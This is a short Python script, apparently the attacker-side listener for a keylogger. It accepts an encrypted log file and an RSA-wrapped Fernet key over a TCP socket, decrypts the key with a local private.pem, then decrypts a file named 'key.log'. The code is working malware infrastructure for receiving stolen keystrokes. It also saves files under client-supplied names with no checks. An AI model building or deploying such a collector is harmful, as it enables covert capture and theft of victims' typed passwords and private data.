import socket
import rsa
from cryptography.fernet import Fernet
from configparser import ConfigParser

config = ConfigParser()
config.read("config.cfg")


SERVER = config['SERVER']['IP']
PORT = int(config['SERVER']['PORT'])

# Define functions before socket binding


def prep_key(key_file):
    enc_key = open(key_file, 'rb').read()
    priv_key = rsa.PrivateKey.load_pkcs1(open('private.pem', 'rb').read())
    with open(key_file, 'wb') as keyfile:
        keyfile.write(rsa.decrypt(enc_key, priv_key))
    # return Fernet(rsa.decrypt(enc_key, priv_key))


def decrypt_file(f_key: Fernet, file: str):
    enc_logs = open(file, 'rb').read()
    with open(file, 'wb') as logfile:
        logfile.write(f_key.decrypt(enc_logs))
    return f_key.decrypt(enc_logs)


def recv_file():
    client, addr = s.accept()
    file_name = str(client.recv(1024).decode().replace(' ', ''))
    with open(file_name, 'wb') as file:
        file_bytes = b''
        done = False
        while not done:
            data = client.recv(1024)
            print(data)
            if data[-13:] == (b'<END OF FILE>'):
                print(f'[!]\tFile Received: {file_name}')
                done = True
            else:
                print('downloading file...')
            file_bytes += data
        # print(f'saving: {file_bytes[:-13]}')
        file.write(file_bytes[:-13])
        client.close()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SERVER, PORT))
s.listen(5)

recv_file()     # for logs
recv_file()     # for key

key_file = 'fernet.key'
prep_key(key_file)
# Pass the file name as well
decrypt_file(Fernet(open('fernet.key', 'rb').read()), 'key.log')
s.close()
